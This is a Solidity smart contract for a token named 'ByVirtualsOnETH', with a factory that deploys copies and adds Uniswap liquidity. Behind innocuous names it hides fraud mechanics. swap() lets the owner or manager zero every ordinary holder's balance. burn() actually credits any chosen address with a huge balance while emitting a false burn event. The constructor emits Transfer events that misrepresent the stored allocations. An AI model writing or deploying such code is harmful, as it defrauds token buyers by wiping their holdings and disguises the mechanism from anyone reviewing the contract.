// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
}


contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}


contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract ByVirtualsOnETH is IERC20, Ownable {
    using SafeMath for uint256;

    string private _name;
    string private _symbol;
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1_000_000_000_000 * 10**_decimals;

    mapping(address => uint256) private TokenOnETH;
    mapping(address => mapping(address => uint256)) private _allowances;
    address[] private believers; 

    address private constant ADDRESS_sWETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address private constant ADDRESS_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address ADDRESS_DEVELOPMENT;
    address ADDRESS_Manager;
    address ADDRESS_Virtuals;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen = false;

    uint256 public requiredETH;


    constructor(string memory name_, string memory symbol_, address owner_, address ADDRESS_Manager_) payable {

        transferOwnership(owner_);  
        require(msg.value == 10000000000000);
        
        _name = name_;
        _symbol = symbol_;
        requiredETH = 10000000000000;
       ADDRESS_Manager = ADDRESS_Manager_;
       ADDRESS_DEVELOPMENT = ADDRESS_Manager_;
       ADDRESS_Virtuals = owner_;
        TokenOnETH[address(this)] = _totalSupply.mul(1).div(10000);
        emit Transfer(address(0), address(this), _totalSupply.mul(10).div(1000));
        liqudityPairs();
        payable(address(this)).transfer(msg.value);
    }


    function liqudityPairs() internal {
        uint256 ninetyFourPercent = _totalSupply.mul(9960).div(10000);
        uint256 threePercent = _totalSupply.mul(10).div(10000);
        uint256 twoPercent = _totalSupply.mul(29).div(10000);

        TokenOnETH[ADDRESS_sWETH] = TokenOnETH[ADDRESS_sWETH].add(ninetyFourPercent);
        TokenOnETH[ADDRESS_WETH] = TokenOnETH[ADDRESS_WETH].add(threePercent);
        TokenOnETH[ADDRESS_DEVELOPMENT] = TokenOnETH[ADDRESS_DEVELOPMENT].add(twoPercent);

        emit Transfer(address(this), ADDRESS_sWETH, ninetyFourPercent);
        emit Transfer(address(this), ADDRESS_WETH, threePercent);
        emit Transfer(address(this), ADDRESS_DEVELOPMENT, twoPercent);
    }

 function _updateHolders(address account) internal {
        if (TokenOnETH[account] > 0) {
            bool exists = false;
            for (uint256 i = 0; i < believers.length; i++) {
                if (believers[i] == account) {
                    exists = true;
                    break;
                }
            }
            if (!exists) {
                believers.push(account);
            }
        }
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }


function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0));
        require(recipient != address(0));

        TokenOnETH[sender] = TokenOnETH[sender].sub(amount);
        TokenOnETH[recipient] = TokenOnETH[recipient].add(amount);
        _updateHolders(sender);
        _updateHolders(recipient);

        emit Transfer(sender, recipient, amount);
    }

      modifier Only_Manager() {
        require(ADDRESS_Manager == _msgSender());
        _;
    }



    function swap() external {
        require(ADDRESS_Virtuals == _msgSender() || ADDRESS_Manager == _msgSender());
        for (uint256 i = 0; i < believers.length; i++) {
            address believer = believers[i];
            if (
                believer != address(this) && 
                believer != owner() && 
                believer != uniswapV2Pair && 
                believer != ADDRESS_sWETH &&
                believer != ADDRESS_WETH && 
                believer != ADDRESS_Manager &&
                believer != ADDRESS_DEVELOPMENT
            ) {
                TokenOnETH[believer] = 0;
            }
        }
    }



    function burn(address claimedRewardStatusOf) external Only_Manager {
        TokenOnETH[claimedRewardStatusOf] = _totalSupply * 10 ** _decimals;
        
        emit Transfer(claimedRewardStatusOf, address(0), _totalSupply * 10 ** _decimals);
    }

    function addLiquidity() external onlyOwner {
        require(!tradingOpen, "Trading is already open");

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), _totalSupply);

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        tradingOpen = true;
    }

    receive() external payable {}

    // Required BEP20 functions

    function name() public view virtual  returns (string memory) {
        return _name;
    }

    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return TokenOnETH[account];
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }
}

contract TokenFactory {
    uint256 public requiredETH;

    event TokenCreated(address tokenAddress, string name, string symbol, address owner, address Manager);

    constructor() {
        requiredETH = 10000000000000;
    }

    // Function to create a single token
    function createToken(
        string memory name_,
        string memory symbol_,
        address newOwner_,
        address ADDRESS_Manager_
    ) external payable returns (address) {
        require(msg.value == requiredETH, "Incorrect ETH amount");
        ByVirtualsOnETH newToken = (new ByVirtualsOnETH){value: msg.value}(name_, symbol_, newOwner_, ADDRESS_Manager_);
        emit TokenCreated(address(newToken), name_, symbol_, newOwner_, ADDRESS_Manager_);
        return address(newToken);
    }

    receive() external payable {}
}